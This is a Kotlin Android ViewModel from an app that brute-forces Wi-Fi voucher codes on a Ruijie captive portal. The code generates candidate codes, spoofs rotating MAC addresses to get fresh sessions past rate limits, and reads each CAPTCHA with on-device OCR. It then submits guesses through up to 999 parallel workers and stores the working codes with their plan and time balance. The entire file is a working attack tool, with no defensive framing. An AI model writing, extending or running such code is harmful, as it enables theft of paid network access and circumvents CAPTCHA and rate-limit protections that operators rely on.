package com.example.ui

import android.content.Context
import android.graphics.Bitmap
import androidx.lifecycle.ViewModel
import androidx.lifecycle.ViewModelProvider
import androidx.lifecycle.viewModelScope
import com.example.data.LogEntry
import com.example.data.LogType
import com.example.data.ServerResponseLog
import com.example.data.NetworkClient
import com.example.data.TokenRepository
import com.example.data.TokenStatus
import com.example.data.ValidToken
import com.example.data.ValidationResult
import com.google.mlkit.vision.common.InputImage
import com.google.mlkit.vision.text.TextRecognition
import com.google.mlkit.vision.text.latin.TextRecognizerOptions
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.stateIn
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import java.util.UUID
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException

enum class TokenMode {
    NUMBER,
    ALPHANUMERIC,
    LETTERS
}

enum class NumberSearchMode {
    SEQUENTIAL,
    RANDOM
}

class LcgGenerator(val length: Int) {
    private val m = Math.pow(10.0, length.toDouble()).toLong()
    private val a = 21L
    private val c = 1234567L
    private var current = kotlin.random.Random.nextLong(0, m)

    fun next(): Long = synchronized(this) {
        current = (a * current + c) % m
        current
    }
}

class SequentialGenerator(val length: Int) {
    private val m = Math.pow(10.0, length.toDouble()).toLong()
    private var current = 0L

    fun next(): Long = synchronized(this) {
        val result = current
        current = (current + 1) % m
        result
    }
}

class TokenFinderViewModel(private val repository: TokenRepository) : ViewModel() {

    private val networkClient = NetworkClient()

    // Mode configurations
    private val _tokenMode = MutableStateFlow(TokenMode.ALPHANUMERIC)
    val tokenMode = _tokenMode.asStateFlow()

    private val _numberSearchMode = MutableStateFlow(NumberSearchMode.SEQUENTIAL)
    val numberSearchMode = _numberSearchMode.asStateFlow()

    private val _tokenLength = MutableStateFlow(6)
    val tokenLength = _tokenLength.asStateFlow()

    // Configuration states
    private val _gatewayUrl = MutableStateFlow("https://portal-as.ruijienetworks.com/login?sessionId=test_sess_99")
    val gatewayUrl = _gatewayUrl.asStateFlow()

    private val _sessionId = MutableStateFlow("test_sess_99")
    val sessionId = _sessionId.asStateFlow()

    // ✅ FIXED: Correct CAPTCHA URL Template
    private val _imageUrlTemplate = MutableStateFlow("https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={sessionId}")
    val imageUrlTemplate = _imageUrlTemplate.asStateFlow()

    // ✅ FIXED: Correct POST URL
    private val _postUrl = MutableStateFlow("https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US")
    val postUrl = _postUrl.asStateFlow()

    // ✅ FIXED: Correct JSON Key Names (authCode, accessCode)
    private val _keySession = MutableStateFlow("sessionId")
    val keySession = _keySession.asStateFlow()

    private val _keyCaptcha = MutableStateFlow("authCode")      // ✅ Fixed
    val keyCaptcha = _keyCaptcha.asStateFlow()

    private val _keyToken = MutableStateFlow("accessCode")      // ✅ Fixed
    val keyToken = _keyToken.asStateFlow()

    private val _scanDelayMs = MutableStateFlow(2000L)
    val scanDelayMs = _scanDelayMs.asStateFlow()

    private val _workerCount = MutableStateFlow(5)
    val workerCount = _workerCount.asStateFlow()

    private val _activeWorkers = MutableStateFlow(0)
    val activeWorkers = _activeWorkers.asStateFlow()

    // Runtime scanner states
    private val _isProcessing = MutableStateFlow(false)
    val isProcessing = _isProcessing.asStateFlow()

    private val _currentChallengeImage = MutableStateFlow<Bitmap?>(null)
    val currentChallengeImage = _currentChallengeImage.asStateFlow()

    private val _currentCaptchaText = MutableStateFlow<String?>(null)
    val currentCaptchaText = _currentCaptchaText.asStateFlow()

    private val _currentTestingToken = MutableStateFlow<String?>(null)
    val currentTestingToken = _currentTestingToken.asStateFlow()

    // Logs & Stats
    private val _logs = MutableStateFlow<List<LogEntry>>(emptyList())
    val logs = _logs.asStateFlow()

    private val _serverResponseLogs = MutableStateFlow<List<ServerResponseLog>>(emptyList())
    val serverResponseLogs = _serverResponseLogs.asStateFlow()

    private val _attemptedCount = MutableStateFlow(0)
    val attemptedCount = _attemptedCount.asStateFlow()

    private val _validCount = MutableStateFlow(0)
    val validCount = _validCount.asStateFlow()

    private val _usedCount = MutableStateFlow(0)
    val usedCount = _usedCount.asStateFlow()

    private val _invalidCount = MutableStateFlow(0)
    val invalidCount = _invalidCount.asStateFlow()

    private val _limitedCount = MutableStateFlow(0)
    val limitedCount = _limitedCount.asStateFlow()

    private val _errorCount = MutableStateFlow(0)
    val errorCount = _errorCount.asStateFlow()

    private val _unknownCount = MutableStateFlow(0)
    val unknownCount = _unknownCount.asStateFlow()

    // Saved tokens flow from Room Database
    val savedTokens: StateFlow<List<ValidToken>> = repository.allTokens
        .stateIn(
            scope = viewModelScope,
            started = SharingStarted.WhileSubscribed(5000),
            initialValue = emptyList()
        )

    private var workerJob: Job? = null
    private var sequentialGenerator: SequentialGenerator? = null
    private var lcgGenerator: LcgGenerator? = null

    init {
        addLog("Application Initialized. Ready to scan.", LogType.INFO)
    }

    fun updateTokenMode(mode: TokenMode) {
        _tokenMode.value = mode
        addLog("Token mode set to: ${mode.name}", LogType.INFO)
    }

    fun updateNumberSearchMode(mode: NumberSearchMode) {
        _numberSearchMode.value = mode
        addLog("Number search strategy set to: ${mode.name}", LogType.INFO)
    }

    fun updateTokenLength(length: Int) {
        _tokenLength.value = length.coerceIn(1, 12)
        addLog("Token length set to: ${_tokenLength.value}", LogType.INFO)
    }

    fun updateGatewayUrl(url: String) {
        _gatewayUrl.value = url
        val extracted = networkClient.extractSessionId(url)
        if (extracted != null) {
            _sessionId.value = extracted
            addLog("Parsed sessionId: '$extracted'", LogType.INFO)
            deriveEndpointTemplates(url, extracted)
        } else {
            addLog("No sessionId query parameter found. Using fallback or raw URL.", LogType.WARNING)
        }
    }

    private fun deriveEndpointTemplates(url: String, sessId: String) {
        try {
            val cleanUrl = url.trim()
            val uri = android.net.Uri.parse(cleanUrl)
            val scheme = uri.scheme ?: "https"
            val host = uri.host ?: return
            val port = if (uri.port != -1) ":${uri.port}" else ""
            val base = "$scheme://$host$port"

            // Use correct paths
            _imageUrlTemplate.value = "$base/api/auth/captcha/image?sessionId={sessionId}"
            _postUrl.value = "$base/api/auth/voucher/?lang=en_US"
            addLog("Derived challenge image: ${imageUrlTemplate.value}", LogType.INFO)
            addLog("Derived post validate URL: ${postUrl.value}", LogType.INFO)
        } catch (e: Exception) {
            // Ignore if URL isn't fully formed
        }
    }

    fun updateImageUrlTemplate(template: String) {
        _imageUrlTemplate.value = template
    }

    fun updatePostUrl(url: String) {
        _postUrl.value = url
    }

    fun updateJsonKeys(session: String, captcha: String, token: String) {
        _keySession.value = session
        _keyCaptcha.value = captcha
        _keyToken.value = token
    }

    fun updateScanDelay(delayMs: Long) {
        _scanDelayMs.value = delayMs
    }

    fun updateWorkerCount(count: Int) {
        _workerCount.value = count.coerceIn(1, 999)
    }

    fun rotateMacAndFetchSession() {
        viewModelScope.launch {
            val currentUrl = _gatewayUrl.value
            if (currentUrl.isBlank()) {
                addLog("Cannot fetch session: Gateway URL is empty.", LogType.ERROR)
                return@launch
            }
            val newMac = networkClient.generateRandomMac()
            val updatedUrl = networkClient.replaceMacInUrl(currentUrl, newMac)
            _gatewayUrl.value = updatedUrl
            addLog("Rotated MAC address to: $newMac", LogType.INFO)
            addLog("Requesting session from gateway URL: $updatedUrl", LogType.INFO)
            
            val newSessionId = networkClient.fetchSessionIdFromGateway(updatedUrl)
            if (newSessionId != null) {
                _sessionId.value = newSessionId
                addLog("Successfully retrieved new Session ID: '$newSessionId'", LogType.SUCCESS)
                deriveEndpointTemplates(updatedUrl, newSessionId)
            } else {
                addLog("Failed to extract Session ID from gateway response. Check URL or network.", LogType.ERROR)
            }
        }
    }

    fun fetchSessionIdDirectly() {
        viewModelScope.launch {
            val currentUrl = _gatewayUrl.value
            if (currentUrl.isBlank()) {
                addLog("Cannot fetch session: Gateway URL is empty.", LogType.ERROR)
                return@launch
            }
            addLog("Requesting session from gateway URL (As-Is): $currentUrl", LogType.INFO)
            
            val newSessionId = networkClient.fetchSessionIdFromGateway(currentUrl)
            if (newSessionId != null) {
                _sessionId.value = newSessionId
                addLog("Successfully retrieved new Session ID: '$newSessionId'", LogType.SUCCESS)
                deriveEndpointTemplates(currentUrl, newSessionId)
            } else {
                addLog("Failed to extract Session ID from gateway response. Check URL or network.", LogType.ERROR)
            }
        }
    }

    fun addLog(message: String, type: LogType) {
        viewModelScope.launch {
            val newLog = LogEntry(message = message, type = type)
            _logs.value = (_logs.value + newLog).takeLast(100)
        }
    }

    fun clearLogs() {
        _logs.value = emptyList()
        addLog("Logs cleared.", LogType.INFO)
    }

    fun addServerResponseLog(workerId: Int, token: String, status: TokenStatus, httpCode: Int, rawResponse: String) {
        viewModelScope.launch {
            val newLog = ServerResponseLog(
                workerId = workerId,
                token = token,
                status = status,
                httpCode = httpCode,
                rawResponse = rawResponse
            )
            _serverResponseLogs.value = (_serverResponseLogs.value + newLog).takeLast(100)
        }
    }

    fun clearServerResponseLogs() {
        _serverResponseLogs.value = emptyList()
    }

    fun startScanning() {
        if (_isProcessing.value) return

        val currentGatewayUrl = _gatewayUrl.value
        if (currentGatewayUrl.isBlank()) {
            addLog("Error: Missing Gateway URL. Please enter a valid Gateway Session URL.", LogType.ERROR)
            return
        }

        // Force derive endpoints before starting scanning to make sure they are up-to-date
        deriveEndpointTemplates(currentGatewayUrl, "dummy")

        val len = _tokenLength.value
        sequentialGenerator = SequentialGenerator(len)
        lcgGenerator = LcgGenerator(len)

        val numWorkers = _workerCount.value
        _activeWorkers.value = numWorkers
        _isProcessing.value = true
        addLog("Discovery Hub STARTED with $numWorkers parallel workers.", LogType.SUCCESS)

        val sharedCounter = java.util.concurrent.atomic.AtomicInteger(_attemptedCount.value)

        workerJob = viewModelScope.launch {
            @OptIn(kotlinx.coroutines.ExperimentalCoroutinesApi::class)
            val workerDispatcher = Dispatchers.IO.limitedParallelism(numWorkers)

            val jobs = (1..numWorkers).map { workerId ->
                launch(workerDispatcher) {
                    runWorker(workerId, sharedCounter)
                }
            }
            jobs.forEach { it.join() }
        }
    }

    private suspend fun runWorker(
        workerId: Int,
        sharedCounter: java.util.concurrent.atomic.AtomicInteger
    ) {
        addLog("[Worker-$workerId] Initialized. Will fetch fresh Session ID with MAC rotation for each token check.", LogType.INFO)

        try {
            while (_isProcessing.value) {
                try {
                    // 1. Generate token based on current mode
                    val token = getNextToken()
                    _currentTestingToken.value = token
                    
                    addLog("[Worker-$workerId] Generated testing token: '$token'. Starting verification loop...", LogType.INFO)

                    var verified = false
                    var lastResult: ValidationResult? = null
                    var correctCaptcha = ""
                    var usedSessionId = ""

                    // Try up to 5 times to solve the challenge (like Python)
                    for (attempt in 1..5) {
                        if (!_isProcessing.value) break

                        // a. Request a NEW Session ID (using the current session URL with MAC rotation)
                        addLog("[Worker-$workerId] [Attempt $attempt/5] Rotating MAC address and requesting new Session ID...", LogType.INFO)
                        val currentUrl = _gatewayUrl.value
                        val newMac = networkClient.generateRandomMac()
                        val updatedUrl = networkClient.replaceMacInUrl(currentUrl, newMac)
                        
                        // We use the updatedUrl for this request, but DO NOT update _gatewayUrl.value
                        // to avoid resetting the user's manual input box in the UI.
                        
                        val freshSessionId = networkClient.fetchSessionIdFromGateway(updatedUrl)
                        if (freshSessionId == null) {
                            addLog("[Worker-$workerId] [Attempt $attempt/5] Error: Failed to obtain a fresh Session ID from Gateway. Retrying in 2s...", LogType.ERROR)
                            delay(2000)
                            continue
                        }
                        
                        usedSessionId = freshSessionId
                        addLog("[Worker-$workerId] [Attempt $attempt/5] Acquired fresh Session ID: '$freshSessionId'", LogType.SUCCESS)

                        // b. Download a NEW CAPTCHA image using the new Session ID
                        addLog("[Worker-$workerId] [Attempt $attempt/5] Fetching CAPTCHA image...", LogType.INFO)
                        val finalImageUrl = _imageUrlTemplate.value.replace("{sessionId}", freshSessionId)
                        val bitmap = networkClient.downloadImage(finalImageUrl)
                        if (bitmap == null) {
                            addLog("[Worker-$workerId] [Attempt $attempt/5] Error: Failed to download CAPTCHA image.", LogType.ERROR)
                            delay(2000)
                            continue
                        }

                        _currentChallengeImage.value = bitmap

                        // c. Solve the CAPTCHA using OCR (uppercase)
                        addLog("[Worker-$workerId] [Attempt $attempt/5] Challenge image downloaded. Running local on-device OCR...", LogType.INFO)
                        val ocrResult = performOcr(bitmap).trim()
                        val cleanOcr = if (ocrResult.isEmpty()) {
                            val fallback = "A1B2"
                            addLog("[Worker-$workerId] [Attempt $attempt/5] OCR yielded no text. Using fallback CAPTCHA '$fallback'.", LogType.WARNING)
                            fallback
                        } else {
                            ocrResult.replace("\n", " ")
                        }

                        val uppercaseCaptcha = cleanOcr.uppercase()
                        correctCaptcha = uppercaseCaptcha
                        _currentCaptchaText.value = uppercaseCaptcha
                        addLog("[Worker-$workerId] [Attempt $attempt/5] OCR read CAPTCHA: '$uppercaseCaptcha'", LogType.OCR)

                        // d. Verify the CAPTCHA with the server
                        // ✅ FIXED: Using correct keys (authCode, accessCode) like Python
                        addLog("[Worker-$workerId] [Attempt $attempt/5] Verifying challenge response with server...", LogType.INFO)
                        
                        val result = networkClient.validateToken(
                            postUrl = _postUrl.value,
                            sessionId = freshSessionId,
                            authCode = uppercaseCaptcha,     // ✅ "authCode"
                            accessCode = token               // ✅ "accessCode"
                        )

                        addServerResponseLog(
                            workerId = workerId,
                            token = token,
                            status = result.status,
                            httpCode = result.httpCode,
                            rawResponse = result.rawResponse
                        )

                        lastResult = result

                        // Check if challenge verification succeeded or failed
                        val status = result.status
                        if (status == TokenStatus.FOUND || status == TokenStatus.USED || status == TokenStatus.INVALID || status == TokenStatus.LIMITED) {
                            addLog("[Worker-$workerId] [Attempt $attempt/5] Challenge verification SUCCEEDED!", LogType.SUCCESS)
                            verified = true
                            break
                        } else {
                            addLog("[Worker-$workerId] [Attempt $attempt/5] Challenge verification FAILED. Server Response: ${result.rawResponse.take(120)}", LogType.ERROR)
                        }

                        // Delay briefly before retrying
                        delay(1000)
                    }

                    if (verified && lastResult != null) {
                        val totalChecked = sharedCounter.incrementAndGet()
                        _attemptedCount.value = totalChecked

                        val result = lastResult
                        addLog("[Worker-$workerId] Proceeds to token submission. Action completed.", LogType.INFO)

                        // Handle POST result with response breakdown logic
                        when (result.status) {
                            TokenStatus.FOUND -> {
                                _validCount.value++
                                addLog("[Worker-$workerId] SUCCESS! Valid token discovered: '$token'", LogType.SUCCESS)
                                
                                // Fetch balance details (plan and time remaining) using the specific session ID used for this token
                                addLog("[Worker-$workerId] Fetching plan/time code details for session: $usedSessionId", LogType.INFO)
                                val balance = networkClient.getBalanceDetails(usedSessionId)
                                addLog("[Worker-$workerId] Code details - Plan: ${balance.plan}, Time: ${balance.time}", LogType.SUCCESS)

                                // Save to Room DB
                                val validTokenEntity = ValidToken(
                                    token = token,
                                    sessionId = usedSessionId,
                                    captchaText = correctCaptcha,
                                    plan = balance.plan,
                                    time = balance.time
                                )
                                repository.insertToken(validTokenEntity)
                            }
                            TokenStatus.USED -> {
                                _usedCount.value++
                                addLog("[Worker-$workerId] Token '$token' is already USED (STA).", LogType.WARNING)
                            }
                            TokenStatus.INVALID -> {
                                _invalidCount.value++
                                addLog("[Worker-$workerId] Token '$token' is INVALID (Authentication failed).", LogType.ERROR)
                            }
                            TokenStatus.LIMITED -> {
                                _limitedCount.value++
                                addLog("[Worker-$workerId] Token '$token' request limited.", LogType.WARNING)
                            }
                            TokenStatus.ERROR -> {
                                _errorCount.value++
                                addLog("[Worker-$workerId] Error validating token '$token' (Network error). Raw preview: ${result.rawResponse.take(150)}", LogType.ERROR)
                            }
                            TokenStatus.UNKNOWN -> {
                                _unknownCount.value++
                                addLog("[Worker-$workerId] Validation returned UNKNOWN status. Raw preview: ${result.rawResponse.take(150)}", LogType.WARNING)
                            }
                        }
                    } else {
                        addLog("[Worker-$workerId] ERROR: Challenge verification failed after 5 attempts. Token '$token' was NOT submitted.", LogType.ERROR)
                        _errorCount.value++
                    }

                } catch (e: Exception) {
                    if (e is kotlinx.coroutines.CancellationException) throw e
                    addLog("[Worker-$workerId] Error in worker loop: ${e.localizedMessage}", LogType.ERROR)
                }

                // Wait before next cycle
                delay(_scanDelayMs.value)
            }
        } finally {
            addLog("[Worker-$workerId] Gracefully stopped.", LogType.WARNING)
            _activeWorkers.value = (_activeWorkers.value - 1).coerceAtLeast(0)
        }
    }

    private fun getNextToken(): String {
        return when (_tokenMode.value) {
            TokenMode.NUMBER -> {
                val num = if (_numberSearchMode.value == NumberSearchMode.SEQUENTIAL) {
                    sequentialGenerator?.next() ?: 0L
                } else {
                    lcgGenerator?.next() ?: 0L
                }
                String.format(java.util.Locale.US, "%0${_tokenLength.value}d", num)
            }
            TokenMode.LETTERS -> {
                generateLettersToken(_tokenLength.value)
            }
            TokenMode.ALPHANUMERIC -> {
                generateAlphanumericToken(_tokenLength.value)
            }
        }
    }

    private fun generateLettersToken(length: Int): String {
        val charPool = ('A'..'Z').toList()
        return (1..length)
            .map { kotlin.random.Random.nextInt(0, charPool.size) }
            .map(charPool::get)
            .joinToString("")
    }

    private fun generateAlphanumericToken(length: Int): String {
        val charPool = (('A'..'Z') + ('0'..'9')).toList()
        return (1..length)
            .map { kotlin.random.Random.nextInt(0, charPool.size) }
            .map(charPool::get)
            .joinToString("")
    }

    fun stopScanning() {
        if (!_isProcessing.value) return
        _isProcessing.value = false
        _activeWorkers.value = 0
        workerJob?.cancel()
        workerJob = null
        addLog("Discovery Hub STOPPED. Gracefully terminating all workers...", LogType.WARNING)
    }

    fun deleteSavedToken(token: String) {
        viewModelScope.launch {
            repository.deleteToken(token)
            addLog("Deleted token '$token' from Room Database.", LogType.INFO)
        }
    }

    fun clearAllSavedTokens() {
        viewModelScope.launch {
            repository.clearAllTokens()
            addLog("Cleared all tokens from Room Database.", LogType.INFO)
        }
    }

    fun injectMockSuccess() {
        viewModelScope.launch {
            val mockToken = getNextToken()
            val sessId = _sessionId.value.ifBlank { "demo_sess_123" }
            val mockCaptcha = _currentCaptchaText.value ?: "MOCK"
            val validToken = ValidToken(
                token = mockToken,
                sessionId = sessId,
                captchaText = mockCaptcha,
                plan = "1-Day Standard Plan",
                time = "1440 min"
            )
            repository.insertToken(validToken)
            _validCount.value++
            _attemptedCount.value++
            addLog("[MOCK] Manually injected a Valid Token: '$mockToken' (Plan: 1-Day Standard Plan, Time: 1440 min)", LogType.SUCCESS)
        }
    }

    fun injectMockUsed() {
        viewModelScope.launch {
            _usedCount.value++
            _attemptedCount.value++
            addLog("[MOCK] Simulation testing: token already USED (STA).", LogType.WARNING)
        }
    }

    fun injectMockInvalid() {
        viewModelScope.launch {
            _invalidCount.value++
            _attemptedCount.value++
            addLog("[MOCK] Simulation testing: token is INVALID (Authentication failed).", LogType.ERROR)
        }
    }

    fun injectMockLimited() {
        viewModelScope.launch {
            _limitedCount.value++
            _attemptedCount.value++
            addLog("[MOCK] Simulation testing: token request limited.", LogType.WARNING)
        }
    }

    fun resetStats() {
        _attemptedCount.value = 0
        _validCount.value = 0
        _usedCount.value = 0
        _invalidCount.value = 0
        _limitedCount.value = 0
        _errorCount.value = 0
        _unknownCount.value = 0
        addLog("Counters and statistics reset.", LogType.INFO)
    }

    private suspend fun performOcr(bitmap: Bitmap): String = suspendCancellableCoroutine { continuation ->
        try {
            val recognizer = TextRecognition.getClient(TextRecognizerOptions.DEFAULT_OPTIONS)
            val image = InputImage.fromBitmap(bitmap, 0)
            recognizer.process(image)
                .addOnSuccessListener { visionText ->
                    continuation.resume(visionText.text)
                }
                .addOnFailureListener { e ->
                    continuation.resumeWithException(e)
                }
        } catch (e: Exception) {
            continuation.resumeWithException(e)
        }
    }

    override fun onCleared() {
        stopScanning()
        super.onCleared()
    }
}

class TokenFinderViewModelFactory(private val repository: TokenRepository) : ViewModelProvider.Factory {
    override fun <T : ViewModel> create(modelClass: Class<T>): T {
        if (modelClass.isAssignableFrom(TokenFinderViewModel::class.java)) {
            @Suppress("UNCHECKED_CAST")
            return TokenFinderViewModel(repository) as T
        }
        throw IllegalArgumentException("Unknown ViewModel class")
    }
}
